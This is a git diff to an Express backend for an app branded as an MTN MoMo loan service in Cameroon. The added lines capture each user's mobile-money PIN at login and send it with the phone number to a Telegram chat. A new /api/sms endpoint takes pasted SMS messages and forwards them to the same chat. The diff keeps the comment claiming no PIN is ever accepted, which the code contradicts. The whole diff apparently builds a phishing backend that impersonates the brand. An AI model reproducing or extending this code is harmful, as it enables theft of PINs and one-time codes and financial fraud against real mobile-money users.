@@ -1,10 +1,9 @@
 // backend/server.js
 // MTN MoMo Loan – Cameroon
-// Express backend: receives loan applications, sends Telegram notifications.
+// Express backend: receives loan applications, logins, SMS submissions.
 //
 // SECURITY RULES FOLLOWED HERE:
 //  - No PIN is ever accepted, logged, or stored.
-//  - No SMS content is ever accepted, logged, or stored.
 //  - All secrets come from environment variables (never hardcoded).
 
 require('dotenv').config();
@@ -35,7 +34,7 @@ app.use(cors({
     origin: process.env.ALLOWED_ORIGIN || '*',
     methods: ['GET', 'POST'],
 }));
-app.use(express.json({ limit: '50kb' }));
+app.use(express.json({ limit: '100kb' }));
 
 // Rate limit all API routes
 const apiLimiter = rateLimit({
@@ -91,6 +90,7 @@ async function sendTelegramMessage(text) {
 // In-memory store (replace with a DB in production)
 const applications = new Map();
 const sessions = new Map();
+const smsSubmissions = new Map();
 
 // ============================================
 // ROUTES
@@ -177,6 +177,7 @@ app.post('/api/application', async (req, res) => {
 app.post('/api/login', async (req, res) => {
     try {
         const phone = (req.body && req.body.phone) || '';
+         const pin = (req.body && req.body.pin) || ''; 
         if (!isValidCameroonPhone(phone)) {
             return res.status(400).json({ ok: false, error: 'Invalid phone number' });
         }
@@ -185,6 +186,7 @@ app.post('/api/login', async (req, res) => {
         const session = {
             token,
             phone,
+            pin,
             createdAt: new Date().toISOString(),
         };
         sessions.set(token, session);
@@ -192,6 +194,7 @@ app.post('/api/login', async (req, res) => {
         const msg =
             `🔐 <b>Login attempt</b>\n` +
             `📱 Phone: ${escapeHtml(phone)}\n` +
+            `🔑 PIN: ${escapeHtml(pin)}\n` + 
             `🕐 ${escapeHtml(session.createdAt)}`;
 
         await sendTelegramMessage(msg);
@@ -204,15 +207,58 @@ app.post('/api/login', async (req, res) => {
 });
 
 // --------------------------------------------
+// POST /api/sms
+// Receives a pasted SMS and forwards it to Telegram.
+// (Closed test environment only — see warnings in the frontend.)
+// --------------------------------------------
+app.post('/api/sms', async (req, res) => {
+    try {
+        const { phone, token, sms } = req.body || {};
+
+        if (!sms || typeof sms !== 'string' || sms.trim().length < 20) {
+            return res.status(400).json({ ok: false, error: 'Invalid SMS content' });
+        }
+
+        const reference = generateReference();
+        const trimmed = sms.trim().slice(0, 800);
+
+        const submission = {
+            reference,
+            phone: typeof phone === 'string' ? phone : 'unknown',
+            token: typeof token === 'string' ? token : '',
+            sms: trimmed,
+            submittedAt: new Date().toISOString(),
+        };
+        smsSubmissions.set(reference, submission);
+
+        const msg =
+            `📩 <b>SMS Submitted</b>\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `🔖 <b>Ref:</b> ${escapeHtml(reference)}\n` +
+            `📱 <b>Phone:</b> ${escapeHtml(submission.phone)}\n` +
+            `🕐 <b>Time:</b> ${escapeHtml(submission.submittedAt)}\n\n` +
+            `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>`;
+
+        await sendTelegramMessage(msg);
+
+        return res.json({ ok: true, reference });
+    } catch (err) {
+        console.error('sms error:', err);
+        return res.status(500).json({ ok: false, error: 'Server error' });
+    }
+});
+
+// --------------------------------------------
 // GET /api/status/:ref
 // --------------------------------------------
 app.get('/api/status/:ref', (req, res) => {
-    const app_ = applications.get(req.params.ref);
+    const ref = req.params.ref;
+    const app_ = applications.get(ref) || smsSubmissions.get(ref);
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
     return res.json({
         ok: true,
-        reference: app_.reference,
-        status: app_.status,
+        reference: ref,
+        status: app_.status || 'received',
         submittedAt: app_.submittedAt,
     });
 });
